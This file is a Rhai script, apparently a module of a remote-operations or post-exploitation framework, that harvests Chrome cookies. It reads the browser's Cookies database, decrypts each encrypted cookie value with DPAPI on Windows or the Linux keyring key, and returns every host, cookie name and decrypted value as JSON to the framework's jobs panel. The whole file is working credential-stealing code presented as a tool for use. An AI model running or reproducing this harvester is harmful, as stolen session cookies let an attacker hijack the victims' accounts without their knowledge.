// cred_chrome.rhai - Chrome cookie harvester.
//
// Reads the Cookies SQLite database read-only via internal_chrome_cookies
// (a running browser is not disturbed), then attempts per-cookie
// decryption of encrypted_value:
//   Windows : internal_dpapi_decrypt (CryptUnprotectData). Covers legacy
//             v10/v11 DPAPI blobs. Chrome 127+ app-bound (v20) blobs fail
//             with an honest error and are reported undecrypted.
//   Linux   : internal_chrome_decrypt_linux (saltysalt/peanuts keyring AES).
//   macOS   : no API support; encrypted_value is reported raw.
//
// Optional arg: args[0] = Chrome profile directory (default: auto-detect).
// Output: one JSON document on stdout (lands in the Jobs panel / history).

fn esc(s) {
    let r = s.replace("\\", "\\\\");
    return r.replace("\"", "\\\"");
}

let profile = if args.len() > 0 { args[0] } else { "" };
let is_windows = internal_env("SystemRoot").contains("Windows");

print_log("cred_chrome: reading cookies (profile: " + (if profile == "" { "default" } else { profile }) + ")");

let js = internal_chrome_cookies(profile);
if js.starts_with("Error:") {
    return "cred_chrome: " + js;
}

let out = "[";
let count = 0;
let decrypted = 0;
let i = 0;
loop {
    let host = internal_json_get(js, i + ".host");
    if host == "null" { break; }
    let name     = internal_json_get(js, i + ".name");
    let secure   = internal_json_get(js, i + ".secure");
    let expires  = internal_json_get(js, i + ".expires_utc");
    let value    = internal_json_get(js, i + ".value");
    let enc      = internal_json_get(js, i + ".encrypted_value");

    let plain = "";
    let note  = "";
    if enc != "null" && enc != "" {
        if is_windows {
            let r = internal_dpapi_decrypt(enc, "");
            if r.starts_with("Error:") {
                note = "dpapi_failed (app-bound v20 blobs are not supported)";
            } else {
                let t = internal_hex_decode(r);
                if t.starts_with("Error:") {
                    note = "dpapi_plaintext_not_utf8";
                } else {
                    plain = t;
                    decrypted += 1;
                }
            }
        } else {
            let t = internal_chrome_decrypt_linux(enc);
            if t.starts_with("Error:") {
                note = "linux_keyring_decrypt_failed (macOS keychain blobs are not supported)";
            } else {
                plain = t;
                decrypted += 1;
            }
        }
    }

    if count > 0 { out += ","; }
    out += "{\"host\":\"" + esc(host) + "\",\"name\":\"" + esc(name) +
           "\",\"secure\":" + secure + ",\"expires_utc\":" + expires +
           ",\"value\":\"" + esc(value) + "\",\"decrypted\":\"" + esc(plain) + "\"";
    if note != "" { out += ",\"note\":\"" + note + "\""; }
    out += "}";
    count += 1;
    i += 1;
}
out += "]";

print_log("cred_chrome: " + count + " cookies, " + decrypted + " decrypted");
return "{\"source\":\"chrome_cookies\",\"cookies\":" + count + ",\"decrypted\":" + decrypted + ",\"rows\":" + out + "}";
